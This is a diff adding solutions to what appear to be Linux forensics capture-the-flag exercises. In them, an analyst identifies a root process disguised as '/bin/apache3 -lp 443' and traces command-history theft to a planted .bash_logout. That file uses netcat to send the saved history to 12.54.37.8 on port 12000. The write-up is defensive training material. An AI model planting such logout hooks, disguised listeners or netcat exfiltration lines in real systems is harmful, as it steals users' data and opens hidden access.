@@ -358,11 +358,65 @@ Machine: Terra
 
 *********************************************************     SOLUTION        **********************************************************
 
-######################################################### Linux Processes 1 5 #########################################################
+find / -type f -size +100000 2>/dev/null # find the file occupying the most size 
+ps aux # views running processes... the one below stands out
 
-What is the process ID (PID) of the SysV Init daemon?
+root      1006  0.0  0.0  21776   588 ?        Ss   Nov06   0:00 /bin/bash -c /bin/apache3 -lp 443 <
+
+############
+
+Non-Standard Apache Command:
+The command /bin/apache3 -lp 443 is not a standard Apache HTTP Server command. Apache typically runs as httpd or apache2, not apache3.
+
+Running as Root:
+Apache and other web servers typically do not run as the root user for security reasons. Seeing Apache running as root is a red flag.
+
+Listening on Port 443:
+While it's normal for web servers to listen on port 443 (HTTPS), the way it's specified in the command (-lp 443) is non-standard.
+
+Use of Bash:
+The use of /bin/bash -c to run this command is unusual for a standard Apache service, which typically starts via a service manager like systemd, not directly from a bash command.
+
+Command Injection or Unauthorized Command Execution: An attacker may have gained access to the server and executed a non-standard command, potentially masquerading as an Apache process.
+Malware or Rootkit: The unusual command might be a part of a malicious script or a rootkit running on the server.
+
+
+Command Injection, Malware or Rootkit # Method
+/bin/bash -c /bin/apache3 -lp 443     # Command
+
+##########
+
+######################################################### Linux Process Find Evil 5 15 #########################################################
+
+Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.
+
+Task: Identify how the command history is stolen from the machine.
+
+The flag is the file used to execute the commands, and where they are sent.
+
+Flag format: /absolute/path/to/file,IP:port
+
+Machine: Terra
 
 *********************************************************     SOLUTION        **********************************************************
+
+# There is a spice in logon and logoff so we should inspect Look in the scripts (.bashrc, .bash_profile or .profile, .bash_logout, etc.) for lines that involve network commands like curl, wget, nc (netcat), or other custom scripts.
+cat .bashrc # should be run from the home directory cd ~ . This shows no content of malicious behavior
+cat .profile # Reveals suspect commands below 
+export HEAD=$(cat /dev/urandom | tr -dc a-f0-9 | head -c 32)
+export HEAD2=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
+
+grep -r "HEAD" ~/ # try to find out what are the contents for the variables HEAD. The output for HEAD is as below
+
+Binary file /home/garviel/Win_Bootkit.vdi matches
+/home/garviel/.bash_logout:history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+/home/garviel/.bash_logout:nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+/home/garviel/.profile:export HEAD=$(cat /dev/urandom | tr -dc a-f0-9 | head -c 32)
+/home/garviel/.profile:export HEAD2=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
+/home/garviel/outputkirwa001.txt:HEAD
+/home/garviel/sorted_output.txt:HEAD
+
+From the fourth file we can tell that the file path is /home/garviel/.bash_logout and this is a nc (netcat) command being sent to ip address 12.54.37.8 port 12000
 
 ######################################################### Linux Processes 1 5 #########################################################
 
